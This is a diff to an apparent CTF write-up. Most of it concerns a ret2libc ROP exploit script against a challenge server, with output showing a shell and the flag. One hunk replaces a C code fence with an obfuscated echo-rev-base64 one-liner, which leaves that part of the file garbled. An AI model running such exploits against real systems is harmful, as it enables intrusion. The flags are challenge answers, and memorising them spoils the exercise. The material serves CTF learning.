@@ -72,21 +72,13 @@ banner=target.recv()
 write_addr=re.findall(b'0x[a-f0-9]{0,12}',banner)[0]
 write_addr=(int(write_addr,0))
 
-print(f"Write address: {hex(write_addr)}")
-
 libc.address=write_addr - libc.symbols['write']
 system=libc.symbols['system']
 puts=libc.symbols['puts']
 exit_fn=libc.symbols['exit']
 shell=next(libc.search(b'/bin/sh\x00'))
-pop_rdi=libc.address + 0×0000000000028215
+pop_rdi=libc.address + 0x0000000000028215
 
-print("Libc_addr base address : " + str(hex(libc.address)))
-print("system address: " + str(hex(system)))
-print("puts address : " + str(hex(puts)))
-print("exit_fn address : " + str(hex(exit_fn)))
-print("shell address : " + str(hex(shell)))
-print("pop_rdi address: " + str(hex(pop_rdi)))
 rop=b""
 rop+=p64(pop_rdi)
 rop+=p64(shell)
@@ -97,6 +89,36 @@ rop+=p64(system)
 payload=b"A" * offset + rop
 target.sendline(payload)
 target.interactive()
+```
+
+Running the code we get the flag
+
+```bash
+plaintext@archlinux ~/D/c/poj (2)> python sol.py
+[*] '/home/plaintext/Downloads/ctf/poj (2)/libc.so.6'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    FORTIFY:    Enabled
+[*] '/home/plaintext/Downloads/ctf/poj (2)/poj'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    RUNPATH:    b'./'
+[+] Opening connection to challenge.bugpwn.com on port 1003: Done
+[*] Switching to interactive mode
+/bin/sh
+$ ls
+flag.txt
+libc.so.6
+poj
+$ cat flag.txt
+battleCTF{Libc_J0P_b4s1c_000_bc8a769d91ae062911c32829608e7d547a3f54bd18c7a7c2f5cc52bd}
+$ 
 ```
 
 ### Kami
@@ -136,7 +158,7 @@ undefined8 main(void)
 
 Kami uses a dangerous function `gets` which can be used for buffer overflow 
 
-```c
+```cecho 952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS | rev | base64 -d
 
 /* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
 
@@ -289,6 +311,7 @@ target.interactive()
 ### Do(ro X2 )
 
 Using FTK Imager we use the provided password and we get the flag at `C:\\Users\\Desktop\\Delano\\Documents\\Image`
+> Analyze the file. Extensive manipulation is required to uncover what’s hidden within.
 
 ### Symphony
 
